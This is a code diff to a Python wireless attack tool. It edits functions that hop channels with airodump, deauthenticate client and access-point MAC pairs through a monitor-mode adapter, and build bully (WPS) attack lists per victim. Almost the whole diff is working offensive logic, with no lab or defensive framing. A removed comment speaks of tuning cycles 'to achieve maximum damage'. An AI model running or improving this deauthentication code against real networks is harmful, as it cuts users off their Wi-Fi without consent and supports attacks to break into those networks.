@@ -36,7 +36,7 @@ def begin_attack(
                  victims_mac = None,
                  net_clients = None,
                  ESSID = None,
-                 attack_time = 180,
+                 attack_time = 10,
                  wireless_adapter = "wlan0mon"
                 ):
 
@@ -62,7 +62,7 @@ def begin_attack(
         assert net_clients  is None
         assert ESSID is None
         assert not dict2 is None
-        attack_list = get_bully_attack_list(dict2)
+        attack_list = get_bully_attack_list(dict2,victims_mac)
 
     else:
         assert victims_mac is None
@@ -74,13 +74,14 @@ def begin_attack(
 
     i = 0
 
-    while TIME_DIFF.total_seconds() < attack_time:
+    while (datetime.now()-CURR_TIME).total_seconds() < attack_time:
+
         channel = attack_list[i]["channel"]
         # set the channel
         airodump = hop_to_channel(channel)
-        # TODO Tinker with list_cycles to achieve maximum damage
         attack_clients(attack_list[i], 1, wireless_adapter, list_cycles=2, time_between_cycles=0 )
         airodump.kill()
+        print ("airodump killed")
         TIME_DIFF = datetime.now() - CURR_TIME
         i = i + 1 if i < len (attack_list) else 0
     return 0
@@ -115,7 +116,7 @@ def de_auth_client( client_mac,
     return r
 
 
-def attack_clients(clients_dict,
+def attack_clients(attack_dict,
                    de_auths_per_client,
                    adapter,
                    timeout=60,
@@ -139,23 +140,23 @@ def attack_clients(clients_dict,
     CURR_TIME = datetime.now()
     TIME_DIFF = datetime.now() - CURR_TIME
 
-    count = 0
-    for i in range (list_cycles):
 
+    for i in range (list_cycles):
         TIME_DIFF = datetime.now() - CURR_TIME
         if timeout < TIME_DIFF.total_seconds() :
             print ("terminating timed attack")
             break
         else:
-            for mac_pair in clients_dict:
-                count += 1
-                de_auth_client(mac_pair["client_mac"],
-                               mac_pair["ap_mac"],
-                               deauths=de_auths_per_client,
-                               adapter=adapter)
-                if time_between_cycles > 0:
-                    print ("sleeping for: " + str(time_between_cycles))
-                    time.sleep(time_between_cycles)
+            de_auth_client(
+                           attack_dict["client_mac"],
+                           attack_dict["ap_mac"],
+                           deauths=de_auths_per_client,
+                           adapter=adapter
+                           )
+            print(i)
+            if time_between_cycles > 0:
+                print ("sleeping for: " + str(time_between_cycles))
+                time.sleep(time_between_cycles)
 
     print ("terminating attack")
 
